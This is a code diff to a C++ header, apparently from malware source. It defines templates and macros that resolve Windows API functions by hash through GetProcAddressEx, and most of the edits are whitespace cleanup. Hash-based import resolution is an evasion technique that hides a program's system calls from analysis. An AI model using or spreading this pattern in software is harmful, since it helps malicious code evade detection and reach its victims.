@@ -80,7 +80,7 @@ inline LPVOID pushargEx()
 
 template <DWORD h, DWORD hash, class A>
 inline LPVOID pushargEx(A a1)
-{	
+{
 	typedef LPVOID (WINAPI *newfunc)(A);
 	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
 	return func(a1);
@@ -88,7 +88,7 @@ inline LPVOID pushargEx(A a1)
 
 template <DWORD h, DWORD hash, class A, class B>
 inline LPVOID pushargEx(A a1,  B a2)
-{	
+{
 	typedef LPVOID (WINAPI *newfunc)(A, B);
 	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
 	return func(a1,a2);
@@ -104,7 +104,7 @@ inline LPVOID pushargEx(A a1,  B a2, C a3)
 
 template <DWORD h, DWORD hash, class A, class B, class C, class D>
 inline LPVOID pushargEx(A a1, B a2, C a3, D a4)
-{	
+{
 	typedef LPVOID (WINAPI *newfunc)(A, B, C, D);
 	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
 	return func(a1,a2,a3,a4);
@@ -112,7 +112,7 @@ inline LPVOID pushargEx(A a1, B a2, C a3, D a4)
 
 template <DWORD h, DWORD hash, class A, class B, class C, class D, class E>
 inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5)
-{	
+{
 	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E);
 	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
 	return func(a1, a2, a3, a4, a5);
@@ -120,7 +120,7 @@ inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5)
 
 template <DWORD h, DWORD hash, class A, class B, class C, class D, class E, class F>
 inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6)
-{	
+{
 	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F);
 	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
 	return func(a1, a2, a3, a4, a5, a6);
@@ -128,7 +128,7 @@ inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6)
 
 template <DWORD h, DWORD hash, class A, class B, class C, class D, class E, class F, class G>
 inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7)
-{	
+{
 	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G);
 	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
 	return func(a1, a2, a3, a4, a5, a6, a7);
@@ -136,7 +136,7 @@ inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7)
 
 template <DWORD h, DWORD hash, class A, class B, class C, class D, class E, class F, class G, class H>
 inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8)
-{	
+{
 	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H);
 	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
 	return func(a1, a2, a3, a4, a5, a6, a7, a8);
@@ -144,7 +144,7 @@ inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8)
 
 template <DWORD h, DWORD hash, class A, class B, class C, class D, class E, class F, class G, class H, class I>
 inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9)
-{	
+{
 	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I);
 	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
 	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9);
@@ -152,7 +152,7 @@ inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9)
 
 template <DWORD h, DWORD hash, class A, class B, class C, class D, class E, class F, class G, class H, class I, class X>
 inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9, X a10)
-{	
+{
 	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I, X);
 	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
 	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10);
@@ -160,7 +160,7 @@ inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9, X 
 
 template <DWORD h, DWORD hash, class A, class B, class C, class D, class E, class F, class G, class H, class I, class X, class Y>
 inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9, X a10, Y a11 )
-{	
+{
 	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I, X, Y);
 	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
 	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11);
@@ -168,7 +168,7 @@ inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9, X 
 
 template <DWORD h, DWORD hash, class A, class B, class C, class D, class E, class F, class G, class H, class I, class X, class Y, class Z, class R>
 inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9, X a10, Y a11, Z a12, R a13)
-{	
+{
 	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I, X, Y, Z, R);
 	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
 	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13);
@@ -178,12 +178,18 @@ template <DWORD h, DWORD hash, class A1, class A2, class A3, class A4, class A5,
 	class A6, class A7, class A8, class A9, class A10, class A11, class A12>
 inline LPVOID pushargEx(A1 a1, A2 a2, A3 a3, A4 a4, A5 a5, A6 a6, A7 a7, A8 a8,
 						A9 a9, A10 a10, A11 a11, A12 a12)
-{	
+{
 	typedef LPVOID (WINAPI *newfunc)(A1, A2, A3, A4, A5, A6, A7, A8, A9, A10,
 									A11, A12);
 	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
 	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12);
 }
+
+
+
+const static int ApiCacheSize = 0;
+
+
 
 
 //kernel32
@@ -730,7 +736,7 @@ inline LPVOID pushargEx(A1 a1, A2 a2, A3 a3, A4 a4, A5 a5, A6 a6, A7 a7, A8 a8,
 
 
 //
-//shlwapi.dll 
+//shlwapi.dll
 #define	pPathFindFileNameA			pushargEx< DLL_SHLWAPI, 0xeed5398c>
 #define pPathFindFileNameW			pushargEx< DLL_SHLWAPI, 0xEED5399A>
 #define pPathCombineA				pushargEx< DLL_SHLWAPI, 0x45B615D5>
